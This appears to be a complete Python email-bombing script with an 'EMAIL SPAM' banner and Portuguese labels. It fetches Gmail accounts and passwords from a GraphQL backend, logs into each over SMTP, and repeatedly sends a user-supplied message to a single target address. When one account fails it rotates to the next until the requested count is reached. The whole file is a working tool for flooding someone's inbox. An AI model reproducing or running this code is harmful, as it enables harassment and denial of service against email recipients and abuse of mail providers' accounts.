from python_graphql_client import GraphqlClient
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
import smtplib, time, os, dotenv, sys

dotenv.load_dotenv(dotenv.find_dotenv())

cl = ""

if(sys.platform == "win32"):
    cl = "cls"
else:
    cl = 'clear'
    
def query(qr):
    return GraphqlClient(endpoint=os.getenv('chave')).execute(qr)

def cls():
    os.system(cl)


class conta_email(): 
    def __init__(self,email,senha): 
        self.email = email 
        self.senha = senha 

    def iniciar(self): 
        self.server = smtplib.SMTP("smtp.gmail.com",587) 
        self.server.ehlo() 
        self.server.starttls() 
        self.server.login(self.email,self.senha) 

    def envia(self,send_mail,titulo,msg,tipo): 
        self.send_mail = send_mail 
        self.titulo = titulo 
        self.msg = msg 
        self.tipo = tipo 
        self.email_msg = MIMEMultipart() 
        self.email_msg["From"] = self.email 
        self.email_msg["To"] = self.send_mail 
        self.email_msg["Subject"] = self.titulo 
        if(self.tipo == 1): 
            self.email_msg.attach(MIMEText(self.msg,"plain")) 
        elif(self.tipo == 2): 
            self.email_msg.attach(MIMEText(self.msg,"html")) 
        else: 
            return "Erro no tipo email" 
        self.server.sendmail(self.email_msg["From"],self.email_msg["To"],self.email_msg.as_string()) 

    def fechar(self): 
        self.server.quit()

contas = []

conts = query("query MyQuery { contas(where: {status: {_eq: true}}) { email senha } }")
for c in conts['data']['contas']:
    contas.append(conta_email(c['email'],c['senha']))

banner = """\n\n\x1b[1;92m
                ███████╗███╗   ███╗ █████╗ ██╗██╗         ███████╗██████╗  █████╗ ███╗   ███╗
                ██╔════╝████╗ ████║██╔══██╗██║██║         ██╔════╝██╔══██╗██╔══██╗████╗ ████║
                █████╗  ██╔████╔██║███████║██║██║         ███████╗██████╔╝███████║██╔████╔██║
                ██╔══╝  ██║╚██╔╝██║██╔══██║██║██║         ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║
                ███████╗██║ ╚═╝ ██║██║  ██║██║███████╗    ███████║██║     ██║  ██║██║ ╚═╝ ██║
                ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  
\n\n                                                                          
"""

atack = """\x1b[1;91m
            ______     ______   ______     __    __     ______     __   __     _____     ______    
           /\  ___\   /\  == \ /\  __ \   /\ "-./  \   /\  __ \   /\ "-.\ \   /\  __-.  /\  __ \   
           \ \___  \  \ \  _-/ \ \  __ \  \ \ \-./\ \  \ \  __ \  \ \ \-.  \  \ \ \/\ \ \ \ \/\ \  
            \/\_____\  \ \_\    \ \_\ \_\  \ \_\ \ \_\  \ \_\ \_\  \ \_\  \_\  \ \____-  \ \_____\ 
             \/_____/   \/_/     \/_/\/_/   \/_/  \/_/   \/_/\/_/   \/_/ \/_/   \/____/   \/_____/ 
                                                                                                                                                                           
                                               
"""

cls()
print(banner)

email = str(input('\n\x1b[1;31m [\x1b[1;33m#\x1b[1;31m] ]====> Email: \x1b[0;0m'))
titulo = str(input('\x1b[1;31m [\x1b[1;33m#\x1b[1;31m] ]====> Titulo: \x1b[0;0m'))
msg = str(input('\x1b[1;31m [\x1b[1;33m#\x1b[1;31m] ]====> MSG: \x1b[0;0m'))
quant = int(input('\x1b[1;31m [\x1b[1;33m#\x1b[1;31m] ]====> Digite o numero de emails: \x1b[0;0m'))

cls()

print(f"{banner}\n\n{atack}\n\n")

cont = 0
while True:
    for c in contas:
        try:
            c.iniciar()
            try:
                while True:
                    c.envia(email,titulo,msg,1)
                    cont = cont + 1
                    print(f"\x1b[1;35m [\x1b[1;94m!\x1b[1;35m] ]====> \x1b[0;0mEmail {cont} enviado\x1b[0;0m")
                    time.sleep(1)
                    if(cont == quant):
                        break
                    else:
                        pass
            except:
                c.fechar()
            if(cont == quant):
                break
            else:
                pass
        except:
            pass
    if(cont == quant):
        break
    else:
        pass